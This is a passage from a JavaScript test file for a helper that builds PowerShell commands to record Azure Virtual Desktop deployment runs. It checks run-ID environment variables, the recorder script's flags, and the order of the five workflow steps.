  assert.deepEqual(P.recording({ record: { runId: 'run-20261021-0517-ab12', mode: 'x' } }), { runId: 'run-20261021-0517-ab12', mode: 'azure' });
  assert.equal(P.recording({ record: { runId: 'run-20261021-0517-ab12', mode: 'on' } }).mode, 'on');
});

test('record: every script block sets the run ID when recording, and none when not', () => {
  const plain = P.commands.runStatus({ ...P.DEFAULTS });
  assert.doesNotMatch(plain, /AVDLZ_/);
  const rec = P.commands.runStatus(REC);
  assert.match(rec, /\$env:AVDLZ_RECORD = 'azure'; \$env:AVDLZ_RUN_ID = 'run-20261021-0517-ab12'/);
  assert.equal(rec.replace(/\n\$env:AVDLZ_RECORD[^\n]*/, ''), plain);
  // Turned off after a recorded block: the variables are cleared.
  assert.match(P.commands.runStatus({ ...P.DEFAULTS, record: { mode: 'azure' } }), /\nRemove-Item Env:AVDLZ_RECORD, Env:AVDLZ_RUN_ID -ErrorAction SilentlyContinue\n/);
});

test('record: open and stop commands carry the run ID and the right flags', () => {
  const start = last(P.commands.recordStart(REC));
  const sizedRec = { ...REC, sizing: P.toSizing(P.computePool({ users: 50, vmSize: '', hostCount: 'auto', profileGiBPerUser: 10 }, 'dev')) };
  const sizedStart = P.commands.recordStart(sizedRec).trim().split('\n');
  assert.match(sizedStart.at(-3), /AVD_SESSION_HOST_COUNT = '\d+'; .*AVD_SESSION_HOST_VM_SIZE = 'Standard_\w+'; .*AVD_MAX_SESSION_LIMIT = '\d+'; .*AVD_PROFILE_QUOTA_GIB = '\d+'/);
  assert.match(sizedStart.at(-2), /Start-AvdRunRecorder\.ps1/);
  assert.equal(sizedStart.at(-1), 'Remove-Item Env:AVD_SESSION_HOST_COUNT, Env:AVD_SESSION_HOST_VM_SIZE, Env:AVD_MAX_SESSION_LIMIT, Env:AVD_PROFILE_QUOTA_GIB -ErrorAction SilentlyContinue');
  assert.match(start, /^\.\/scripts\/ops\/Start-AvdRunRecorder\.ps1 -RunId run-20261021-0517-ab12 -ParameterFile parameters\/dev\.bicepparam -Location \S+ -Hours 3 -Cap 10$/);
  assert.match(last(P.commands.recordStop(REC, 'before-cleanup')), /-RunId run-20261021-0517-ab12 .*-BeforeCleanup$/);
  assert.match(last(P.commands.recordStop(REC, 'end')), /-Status torn-down$/);
  assert.match(last(P.commands.recordStop(REC, 'copy')), /-CopyTo github$/);
  assert.match(last(P.commands.recordStop(REC, 'cost')), /-UpdateCost$/);
  assert.equal(P.commands.recordStop(REC, 'nope'), '');
  assert.equal(P.commands.recordStart({ ...P.DEFAULTS }), '');
  const local = { ...P.DEFAULTS, record: { runId: 'run-20261021-0517-ab12', mode: 'on' } };
  assert.match(last(P.commands.recordStart(local)), / -Local$/);
});

test('record: Cloud Shell only promises no cost reading', () => {
  const a = P.recordActions({ ...REC, record: { ...REC.record, mode: 'on' } });
  assert.equal(a.length, 4);
  assert.ok(!a.some((x) => /UpdateCost/.test(x.command)));
  assert.match(a[2].why, /reads no actual cost/);
});

test('record: recordActions lists the five steps in order, each self-contained', () => {
  assert.deepEqual(P.recordActions({}), []);
  const a = P.recordActions(REC);
  assert.deepEqual(a.map((x) => x.title), ['Open the run', 'Before cleanup: keep the logs', 'After cleanup: close the run', 'Copy it to your private repo', 'Later: read the cost again']);
  assertSelfContained({ actions: a });
  for (const x of a) assert.match(x.command, /AVDLZ_RUN_ID = 'run-20261021-0517-ab12'/);
});
